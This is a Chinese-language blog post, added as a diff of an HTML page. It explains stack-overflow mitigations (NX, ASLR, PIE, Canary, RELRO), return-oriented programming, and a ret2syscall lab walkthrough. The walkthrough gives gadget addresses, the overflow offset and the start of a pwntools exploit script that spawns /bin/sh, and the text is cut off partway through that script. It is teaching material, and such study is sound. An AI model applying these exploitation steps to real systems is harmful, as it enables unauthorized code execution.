@@ -1,0 +1,769 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="X2n." />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      二进制之ROP技巧学习 
+      
+      
+      |
+    
+     X2n.: Keep your passion for what you love !
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="X2n.: Keep your passion for what you love !" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">X2n.</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Category</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">二进制之ROP技巧学习</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2025-08-27 16:35:50
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="栈溢出">
+                    #栈溢出
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/ROP/" title="ROP">
+                    #ROP
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" title="二进制安全">
+                    <b>#</b> 二进制安全
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="防止栈溢出的保护措施">防止栈溢出的保护措施</h2>
+<p>根据之前写过的文章<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>，了解到了栈溢出漏洞的原理，但是目前存在很多种保护栈溢出的措施，下面我们来介绍一下。</p>
+<p><code>The NX bits</code>、<code>ASLR</code>、<code>PIE</code>、<code>Canary</code>、<code>RELRO</code></p>
+<h3 id="The-NX-bits">The NX bits</h3>
+<p>NX位是“No-Execute bit”的缩写，中文意为“禁止执行位”。它是现代CPU硬件层面的一种安全功能，用来将内存区域标记为“可执行”或“不可执行”。</p>
+<p>简单来说，操作系统会将内存的不同区域进行标识：</p>
+<ul>
+<li><strong>代码区 (.text)</strong>：存放程序的指令代码，这部分内存需要被执行，所以会被标记为“可执行”。</li>
+<li><strong>数据区（.data, .bss）和栈（Stack）</strong>：这些区域用来存放变量、数据和函数调用信息。正常情况下，这些区域的数据只应该被读取和写入，而<strong>不应该被当作指令来执行</strong>。</li>
+</ul>
+<p>NX位的作用就是由操作系统和CPU硬件共同强制执行这个规则。</p>
+<p>当NX位功能开启时，如果程序试图跳转到并执行位于<strong>栈上</strong>或<strong>堆上</strong>等非执行区域的代码，CPU会直接抛出一个硬件异常，从而阻止这段代码的执行，并通常会使程序崩溃。</p>
+<h3 id="ASLR">ASLR</h3>
+<p>ASLR的全称是 <strong>Address Space Layout Randomization</strong>，中文译为“<strong>地址空间布局随机化</strong>”。它是一种非常重要的计算机安全技术，用于防范内存攻击，如缓冲区溢出、返回导向编程（ROP）等。</p>
+<p>简单来说，ASLR就是让程序在每次运行时，其关键部分的内存地址都是<strong>随机</strong>的，而不是固定的。</p>
+<p>具体到操作系统层面，当一个程序启动时，ASLR会随机化以下关键内存区域的基地址：</p>
+<ul>
+<li><strong>栈 (Stack)</strong>：存放局部变量和函数调用信息。</li>
+<li><strong>堆 (Heap)</strong>：动态分配内存的地方。</li>
+<li><strong>共享库 (Libraries)</strong>：程序所依赖的系统函数库（如<code>libc.so</code>）。</li>
+<li><strong>可执行文件本身 (.text)</strong></li>
+</ul>
+<p>这样一来，每次程序加载到内存中时，这些区域的地址都会改变。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看ASLR状态</span></span><br><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">0 = 关闭</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1 = 部分开启。共享库、栈、mmap()以及VDSO将被随机化。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2 = 完全开启。在为1的基础上，通过brk()分配的内存空间也将被随机化。</span></span><br></pre></td></tr></table></figure>
+<h3 id="PIE">PIE</h3>
+<p><strong>定义：</strong></p>
+<p>PIE，全称为“位置无关可执行文件”（Position-Independent Executable），是一种特殊编译模式下生成的可执行二进制文件格式。其核心特性是，该<strong>文件的程序代码能够在进程虚拟地址空间的任意非固定基地址上加载并正确执行</strong>，而无需运行时进行代码重定位。</p>
+<p><strong>实现原理：</strong></p>
+<p>PIE的实现依赖于编译器和链接器在生成代码时采用特定的寻址模式：</p>
+<ul>
+<li><strong>相对寻址 (Relative Addressing):</strong> PIE程序内部的函数调用、分支跳转和数据访问不使用硬编码的绝对虚拟地址。取而代之的是，它使用基于**指令指针（Instruction Pointer, 在x86-64架构下为RIP）**的相对地址。所有内部目标的地址都被计算为“当前指令地址 + 一个固定的偏移量”。由于代码块内部的相对距离在链接时就已确定，因此无论整个代码块被加载到内存的哪个基地址，这种相对关系都保持不变。</li>
+<li><strong>间接寻址 (Indirect Addressing):</strong> 对于外部符号（如共享库中的函数或全局变量），PIE通过全局偏移表（GOT, Global Offset Table）和过程链接表（PLT, Procedure Linkage Table）等数据结构进行间接寻址。代码首先通过相对地址访问GOT/PLT中的条目，然后动态链接器（dynamic linker）在程序加载时负责将这些条目填充为外部符号的真实绝对地址。</li>
+</ul>
+<p><strong>功能与目的：</strong></p>
+<p>PIE的主要功能是**使能地址空间布局随机化（ASLR）**对可执行文件本身的应用。标准的ASLR可以随机化栈、堆和共享库的基地址，但对于一个非PIE编译的主程序，其自身的代码段（<code>.text</code>）和数据段（<code>.data</code>）通常会被加载到一个固定的、在链接时就已决定的基地址。PIE则消除了这个限制，允许操作系统加载器将整个可执行文件的内存映像放置在每次运行时都不同的随机基地址上。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译为PIE程序</span></span><br><span class="line">gcc -pie -fPIE -o program program.c</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译为非PIE程序</span>  </span><br><span class="line">gcc -no-pie -o program program.c</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看程序类型</span></span><br><span class="line">readelf -h program | grep Type</span><br></pre></td></tr></table></figure>
+<p><strong>实际效果演示：</strong></p>
+<p>非PIE + ASLR关闭：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">程序总是加载到固定地址：0x400000</span><br><span class="line">栈地址固定：0x7fffffffe000</span><br></pre></td></tr></table></figure>
+<p>非PIE + ASLR开启：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">程序加载地址固定：0x400000</span><br><span class="line">但栈地址随机：0x7fff8c2b4a80 / 0x7fff2a1c3b90</span><br></pre></td></tr></table></figure>
+<p>PIE + ASLR开启：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">程序加载地址随机：0x555555554000 / 0x555555756000</span><br><span class="line">栈地址随机：0x7fff8c2b4a80 / 0x7fff2a1c3b90</span><br></pre></td></tr></table></figure>
+<h3 id="Canary">Canary</h3>
+<p><strong>定义：</strong></p>
+<p>Canary，也称为“栈保护器”（Stack Protector），是一种由编译器实现的、用于在运行时检测栈缓冲区溢出（Stack Buffer Overflow）的漏洞缓解技术。其核心机制是在函数的返回地址等关键控制数据之前，放置一个攻击者不可预测的秘密值（即Canary值）。</p>
+<p><strong>原理机制：</strong></p>
+<p>该机制在函数的生命周期内通过以下两个关键阶段实现：</p>
+<ul>
+<li><strong>函数前序 (Function Prologue):</strong> 当一个受此机制保护的函数被调用时，在其栈帧建立的初始阶段，一个特殊的Canary值会从一个安全的、通常为只读的内存区域（例如通过<code>fs</code>/<code>gs</code>段寄存器访问的线程本地存储 Thread-Local Storage）被复制到当前函数的栈帧上。该值被精确地放置在所有局部变量（特别是缓冲区）与保存的旧帧指针（EBP/RBP）及函数返回地址之间。</li>
+<li><strong>函数尾声 (Function Epilogue):</strong> 在函数执行完毕、即将执行返回指令（<code>ret</code>）之前，程序会执行一个强制的校验操作。它会从栈帧的相应位置读回Canary值，并将其与存储在安全内存区域中的原始值进行比较。</li>
+</ul>
+<p><strong>运行逻辑：</strong></p>
+<p><strong>校验成功:</strong> 如果栈上的Canary值与原始值完全一致，表明栈帧的控制数据区域未被篡改，函数将继续执行，并正常返回到其调用者。</p>
+<p><strong>校验失败:</strong> 如果两者不一致，则表明发生了一次缓冲区溢出，攻击者写入的数据已经覆盖了Canary。程序会判定这是一次潜在的攻击行为，将立即停止正常的执行流程，并调用一个预设的异常处理函数（例如，在glibc中为 <code>__stack_chk_fail</code>）。该函数通常会输出错误信息并立即终止整个进程。</p>
+<p><strong>安全目标：</strong></p>
+<p>Canary机制的主要安全目标是为栈帧的完整性提供运行时保护。<strong>它通过在攻击者必须覆盖的路径上设置一个检查点，确保在被恶意修改的返回地址被CPU使用之前就能检测到内存损坏</strong>。通过在检测到篡改后立即终止程序，Canary有效地阻止了基于栈溢出的控制流劫持（Control-Flow Hijacking）攻击。</p>
+<p>此机制通过在编译时传递特定标志（例如，GCC/Clang中的 <code>-fstack-protector</code> 或 <code>-fstack-protector-all</code>）来启用。</p>
+<h3 id="RELRO">RELRO</h3>
+<p><strong>定义：</strong></p>
+<p>RELRO，全称为“Relocation Read-Only”（重定位只读），是一种由链接器（linker）和加载器（loader）共同实现的漏洞缓解技术。其核心功能是<strong>在程序启动后，将部分包含重定位信息的内存区域的权限设置为只读</strong>，以防止攻击者在运行时篡改这些区域。</p>
+<p><strong>针对的安全威胁：</strong></p>
+<p>在没有RELRO保护的情况下，一些存储着函数指针或数据指针的内存段在整个程序运行期间都是可写的。攻击者可利用内存损坏漏洞覆写这些指针，特别是**全局偏移表（GOT, Global Offset Table）**中的条目，以劫持程序控制流。这种攻击通常被称为“GOT Overwrite”攻击。RELRO旨在消除或减小此类攻击的可行性。</p>
+<p><strong>实现原理和级别：</strong></p>
+<p>RELRO机制分为两种级别：<code>Partial RELRO</code>和<code>Full RELRO</code>。</p>
+<ul>
+<li><strong>Partial RELRO (部分RELRO)</strong>
+<ul>
+<li><strong>启用方式:</strong> 通过链接器标志 <code>-z relro</code> 启用。</li>
+<li><strong>工作机制:</strong> 链接器会重排ELF文件的内部段，并将 <code>.ctors</code>、<code>.dtors</code>、<code>.got</code> (非PLT部分) 等数据段标记为在动态链接器处理完其初始重定位后，应由加载器（loader）将其权限设置为只读。</li>
+<li><strong>局限性:</strong> 在Partial RELRO模式下，用于动态函数解析的 <code>.got.plt</code> 段仍然保持<strong>可写</strong>状态，以支持<strong>延迟绑定（Lazy Binding）</strong>。延迟绑定是一种性能优化，即函数地址只在其第一次被调用时才由动态链接器进行解析和填充。由于 <code>.got.plt</code> 保持可写，攻击者仍然有机会篡改这部分GOT条目。</li>
+</ul>
+</li>
+<li><strong>Full RELRO (完全RELRO)</strong>
+<ul>
+<li><strong>启用方式:</strong> 通过链接器标志 <code>-z relro -z now</code> 启用。</li>
+<li><strong>工作机制:</strong> <code>-z now</code> 标志会强制<strong>禁用延迟绑定</strong>。它要求动态链接器在程序启动时，就必须解析所有动态链接符号，而不是在函数第一次被调用时才解析。</li>
+<li><strong>安全优势:</strong> 由于所有重定位工作都在加载时一次性完成，整个全局偏移表（GOT）在程序开始执行其主逻辑之前，就可以被内存管理器（例如通过 <code>mprotect</code> 系统调用）设置为<strong>完全只读</strong>。</li>
+<li><strong>结果:</strong> 这从根本上杜绝了运行时对GOT表的任何修改尝试，能完全有效地防御GOT Overwrite攻击。其代价是可能会稍微增加程序的启动时间。</li>
+</ul>
+</li>
+</ul>
+<p><strong>安全目标：</strong></p>
+<p>RELRO的主要安全目标是缩减程序的攻击面（Attack Surface）。通过将动态链接过程完成后不再需要写入的内存区域（特别是GOT）的权限从“可读可写”收紧为“只读”，来防止针对这些关键数据结构的内存覆写攻击。Full RELRO提供了当前最高级别的GOT保护，是现代安全编译选项中的重要组成部分。</p>
+<h2 id="ROP（Return-Oriented-Programming）">ROP（Return Oriented Programming）</h2>
+<p>传统的漏洞利用（比如栈溢出）可以直接在栈上写入 <strong>shellcode</strong> 并跳过去执行。<br>
+但现代系统有 <strong>DEP（Data Execution Prevention）/NX（No eXecute）</strong> 保护 —— 栈、堆不能执行代码。</p>
+<p>这样，攻击者就不能随便在栈上放一段 shellcode 来运行。那么就要使用到ROP去进行攻击。</p>
+<h3 id="ROP的核心思想">ROP的核心思想</h3>
+<p>既然不能执行栈上的新代码，那攻击者就 <strong>利用二进制程序或库里已经存在的代码片段</strong>。</p>
+<ul>
+<li>这些片段通常以 <code>ret</code> 指令结尾</li>
+<li>攻击者把这些片段的地址按顺序放到栈上</li>
+<li>当函数返回 (<code>ret</code>) 时，程序跳到攻击者指定的片段</li>
+<li>一个片段执行一点操作，再 <code>ret</code>，跳到下一个片段</li>
+</ul>
+<p>这些片段叫 <strong>gadgets</strong>。<br>
+组合起来，就像用乐高积木拼出任意功能 —— 这就是 ROP。</p>
+<h3 id="系统调用">系统调用</h3>
+<p><strong>什么是系统调用？</strong></p>
+<p>用户程序要访问内核资源（文件、网络、进程等）时，不能直接操作，只能通过 <strong>系统调用 (syscall)</strong>。</p>
+<p><strong>二进制里系统调用的方式</strong></p>
+<ol>
+<li><strong>库函数封装</strong><br>
+调用 <code>write()</code>、<code>open()</code> 这样的函数时，glibc 内部最终会触发 <code>syscall</code>。</li>
+<li><strong>直接调用指令</strong><br>
+汇编里直接写 <code>syscall</code>（x86-64）、<code>int 0x80</code>（x86）、<code>svc #0</code>（ARM）、<code>ecall</code>（RISC-V）。</li>
+</ol>
+<p><strong>参数传递规则 (Linux x86-64)</strong></p>
+<ul>
+<li><code>rax</code> = 系统调用号</li>
+<li><code>rdi, rsi, rdx, r10, r8, r9</code> = 参数</li>
+<li>返回值放在 <code>rax</code></li>
+</ul>
+<p><strong>实例</strong></p>
+<p>C代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">1</span>, <span class="string">&quot;Hi\n&quot;</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure>
+<p>反汇编后核心就是：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 1      ; sys_write</span><br><span class="line">mov rdi, 1      ; fd = stdout</span><br><span class="line">mov rsi, msg    ; 数据地址</span><br><span class="line">mov rdx, 3      ; 长度</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<h3 id="ROP整个过程的分析">ROP整个过程的分析</h3>
+<p>在程序（32位）中没有已存在的一段代码是：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax, 0xb</span><br><span class="line">mov ebx, [&quot;/bin/sh&quot;]</span><br><span class="line">mov ecx, 0</span><br><span class="line">mov edx, 0</span><br><span class="line">ini 0x80</span><br><span class="line">=&gt; execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure>
+<p>我们仍要执行<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code>该怎么做呢？使用ROP！！！</p>
+<h4 id="ROP原理图">ROP原理图<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup></h4>
+<p><img src="/2025/08/19/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B9%8BROP%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/image-20250823234842405.png" alt="image-20250823234842405"></p>
+<h4 id="1、栈溢出覆盖返回地址">1、栈溢出覆盖返回地址</h4>
+<p>前提：<strong>这里到了<code>stack overflow；ret;</code>，栈溢出然后覆盖返回地址。</strong></p>
+<p>下面开始执行汇编代码，执行到了<code>ret;</code>这里，<code>ret</code>，其实其本质就是<code>pop eip</code>，即将栈里面的返回地址，存放到<code>EIP</code>寄存器中，<code>EIP</code>中负责存放下一个执行的指令的地址，然后<code>esp</code>向上移动。</p>
+<p>所以，这里就是把返回地址<code>0x08052318</code>地址存放在寄存器<code>EIP</code>中，然后下一个就是执行这个<code>EIP</code>寄存器中的地址<code>0x08052318</code>的位置。</p>
+<p>这个<code>0x08052318</code>地址存放的指令为<code>pop %edx; ret;</code>。</p>
+<p>同样的执行，先执行<code>pop %edx</code>，<code>esp</code>向上移动，将<code>0x0c0c0c</code>存放到寄存器<code>edx</code>中。然后再执行<code>ret</code>命令，同样<code>esp</code>上移，然后，将<code>0x0809951f</code>地址存放到寄存器<code>EIP</code>中，作为下一个执行的指令的地址。</p>
+<p><img src="/2025/08/19/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B9%8BROP%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/image-20250824000112138.png" alt="image-20250824000112138"></p>
+<h4 id="2、返回地址指向第一个gadget">2、返回地址指向第一个gadget</h4>
+<p>接着前面说的，这里的<code>0x0809951f</code>地址已经存放在了<code>EIP</code>中，然后执行<code>EIP</code>寄存器中地址的指令，即这里的<code>xor %eax,%eax; ret</code>这条指令。</p>
+<p>先执行<code>xor %eax,%eax</code>，这个是表示<code>%eax = %eax xor %eax</code>，这里的计算的结果其实就是<code>0</code>，将自身的异或的结果存在<code>eax</code>寄存器中。然后再执行<code>ret</code>，<code>esp</code>再次上移，将<code>0x080788c1</code>存放在<code>EIP</code>寄存器中等待下一个执行。</p>
+<p><img src="/2025/08/19/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B9%8BROP%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/image-20250824000241885.png" alt="image-20250824000241885"></p>
+<h4 id="3、但会地址指向第二个gadget">3、但会地址指向第二个gadget</h4>
+<p>紧接着上面，<code>EIP</code>寄存器中现在存的地址为<code>0x080788c1</code>，然后调到地址<code>0x080788c1</code>去执行该处的指令<code>mov %eax, (%edx); ret</code>，将<code>edx</code>寄存器中的值给<code>eax</code>寄存器。然后执行<code>ret</code>指令，<code>esp</code>上移，将<code>0x41414141</code>地址存放到<code>EIP</code>寄存器中等待下一步的执行。</p>
+<p><img src="/2025/08/19/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B9%8BROP%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/image-20250824000508879.png" alt="image-20250824000508879"></p>
+<h4 id="4、结束ROP">4、结束ROP</h4>
+<p>最后就是全部一整个流程执行完成了。</p>
+<p><img src="/2025/08/19/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B9%8BROP%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/image-20250824000816105.png" alt="image-20250824000816105"></p>
+<h3 id="ROP流程图">ROP流程图</h3>
+<p><img src="/2025/08/19/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B9%8BROP%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/image-20250827124804969.png" alt="image-20250827124804969"></p>
+<h2 id="ret2syscall案例">ret2syscall案例</h2>
+<h3 id="查看文件的安全防护">查看文件的安全防护</h3>
+<p>首先是<code>ret2syscall</code>查看可执行文件的安全防护情况。</p>
+<p><img src="/2025/08/19/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B9%8BROP%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/image-20250827142825491.png" alt="image-20250827142825491"></p>
+<p><code>canary</code>未启用，可以进行栈溢出，<code>NX</code>开启了，栈不可执行，不能直接栈上写入<code>shellcode</code>。我的服务器，<code>ASLR</code>是开启了的，栈的基地址是随机的，所以这里写<code>shellcode</code>在栈上也是不行的，找不到写的<code>shellcode</code>的地址，<code>PIE</code>未启用。</p>
+<h3 id="对返回地址进行覆盖">对返回地址进行覆盖</h3>
+<p>使用IDA Pro进行反编译查看，使用了<code>gets</code>函数，<code>int v4</code>变量，存在栈溢出。</p>
+<p><img src="/2025/08/19/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B9%8BROP%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/image-20250827144503998.png" alt="image-20250827144503998"></p>
+<p>使用gdb查看覆盖需要填充的字符。这里发现在<code>get</code>输入一个正常的字符串以后是上移了<code>0x1c</code>即上移了<code>(16+12) * 4 =112</code>字节。此时，如果填充字符超过这个字节数量，就会覆盖函数调用的返回地址。</p>
+<p><img src="/2025/08/19/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B9%8BROP%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/image-20250827151300955.png" alt="image-20250827151300955"></p>
+<h3 id="构造gadgets">构造gadgets</h3>
+<p>根据安全防护，这里只能使用到rop去进行攻击。</p>
+<p>rop需要去执行的一段代码为<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code>，对应的汇编代码为：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax, 0xb</span><br><span class="line">mov ebx, [&quot;/bin/sh&quot;]</span><br><span class="line">mov ecx, 0</span><br><span class="line">mov edx, 0</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+<p>使用<code>ROPgadget</code>去寻找<code>gadget</code>的地址。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ret2syscall --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="第1个gadget">第1个gadget</h4>
+<p>首先找到第1个<code>gadget</code>，给eax寄存器赋值。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x080bb196 : pop eax ; ret</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/08/19/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B9%8BROP%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/image-20250827153454785.png" alt="image-20250827153454785"></p>
+<h4 id="第2个gadget">第2个gadget</h4>
+<p>找到了第2个<code>gadget</code>，分别给<code>edx、ecx、ebx</code>寄存器赋值。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/08/19/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B9%8BROP%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/image-20250827154201558.png" alt="image-20250827154201558"></p>
+<p>找对应的寄存器中的值，即<code>0、0、/bin/sh</code>。</p>
+<p>使用IDA Pro进行反编译，找打<code>/bin/sh</code>字符串对应的地址为：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.rodata:080BE408 aBinSh          db &#x27;/bin/sh&#x27;,0          ; DATA XREF: .data:shell↓o</span><br></pre></td></tr></table></figure>
+<h4 id="第3个gadget">第3个gadget</h4>
+<p>最后一个要<code>int 0x80</code>，进行系统的调用。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08049421 : int 0x80</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/08/19/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B9%8BROP%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/image-20250827154644516.png" alt="image-20250827154644516"></p>
+<h4 id="总结利用">总结利用</h4>
+<p>根据上面的3个gadget，可以构造下面的溢出的内容。</p>
+<p><img src="/2025/08/19/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B9%8BROP%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/image-20250827161754175.png" alt="image-20250827161754175"></p>
+<p>我们再来正向解释一下：</p>
+<p>首先，是栈溢出覆盖了函数的返回地址，返回地址<code>pop_eax_ret addr</code>的内容为<code>0x080bb196</code>，该地址的指令为<code>pop eax ; ret</code>，这是第1个gadget，将<code>0xb</code>的存储到寄存器<code>eax</code>中，再执行<code>ret</code>，将<code>pop_edx_ecx_ebx_ret addr</code>即<code>0x0806eb90</code>给到<code>EIP</code>寄存器，即下一条要执行的命令。然后执行 <code>0x0806eb90</code>地址处的指令<code>pop edx ; pop ecx ; pop ebx ; ret</code>，这是第2个gadget，将<code>0、0、[&quot;/bin/sh&quot;]</code>分别存放在寄存器<code>edx、ecx、ebx</code>中，再执行<code>ret</code>，将<code>int_0x80_addr</code>即<code>0x08049421</code>给到<code>EIP</code>寄存器，即下一条要执行的命令。执行<code>int 0x80</code>，这是第3个gadget。</p>
+<h3 id="编写脚本exp-py"><a target="_blank" rel="noopener" href="http://xn--exp-y11e999gp83ai7c.py">编写脚本exp.py</a></h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;../ret2syscall&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">binsh = <span 